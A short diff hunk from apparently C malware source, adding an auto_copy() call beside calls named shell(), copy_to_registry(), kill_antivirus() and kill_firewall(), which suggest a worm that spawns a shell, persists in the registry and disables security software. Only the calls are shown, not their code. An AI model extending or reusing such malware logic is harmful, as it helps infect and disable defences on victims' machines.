@@ -202,7 +202,8 @@ void copy_to_registry()
     while(1)
 
     shell();
-
+	   
+    auto_copy();	   
     copy_to_registry();
     kill_antivirus();
     kill_firewall();
